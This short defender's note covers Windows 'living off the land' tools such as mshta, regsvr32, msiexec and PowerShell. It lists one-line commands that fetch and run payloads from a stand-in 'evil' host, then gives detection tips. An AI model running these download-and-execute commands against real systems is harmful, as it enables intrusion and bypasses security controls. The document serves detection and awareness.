Living Off the Land techniques for exploitation are popular among both sophisticated and unsophisticated adversaries. 
Adversaries predominantly may use below windows utilities to download any executables and bypass security devices or proxy  or
application whitelisting etc.
Their use reduces the likelihood of detection and may increase the required investigation time.

Windows Utilities:
certutil
Regsvr32
MSHTA
Powershell
msiexec
curl

Usage :
mshta.exe https[:]//evil/evil[.]hta
mshta evil[.]hta
regSvr32 /s /n /u /i:http[:]//evil.php/evil.sct scrobj.dll
MSIEXEC /j m evil[.]msi
msiexec /q /i http[:]//evil/evil[.]msi 
Powershell:Invoke-WebRequest -Uri $url -OutFile $outpu
Powershell:(New-Object System.Net.WebClient).DownloadFile($url, $output
Powershell:Start-BitsTransfer -Source $url -Destination $output -Asynchronous


Detection:
1.Look for these utilities prefetch files and Parsing the prefetch will provide the executed file. 
2.Command execution and arguments passed to these utilities using EDR solutions.
3.Look for the HTTP useragents with regsvr32/mshta/certuril in the network recorders or the proxy logs.
4.Look for suspicious process in the system with parent process as these utilities.
